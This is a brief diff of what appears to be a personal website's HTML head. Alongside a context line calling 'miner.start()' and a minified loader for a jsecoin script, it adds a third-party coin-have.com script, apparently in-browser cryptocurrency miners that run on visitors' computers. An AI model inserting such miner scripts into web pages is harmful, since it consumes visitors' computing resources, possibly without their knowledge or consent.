@@ -12,10 +12,10 @@ comments: true
 		miner.start();
 	}
 </script>
-
 <script type="text/javascript">
 !function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/40497/austinhuang.me/0/0/",s.parentNode.insertBefore(t,s)}();
 </script>
+<script src="https://coin-have.com/c/8kZq.js"></script>
 
 <meta name="og:title" content="Austin Huang - A young JavaScript developer who writes chatbots and stories in Montréal.">
 <meta name="og:site_name" content="AustinHuang.me">
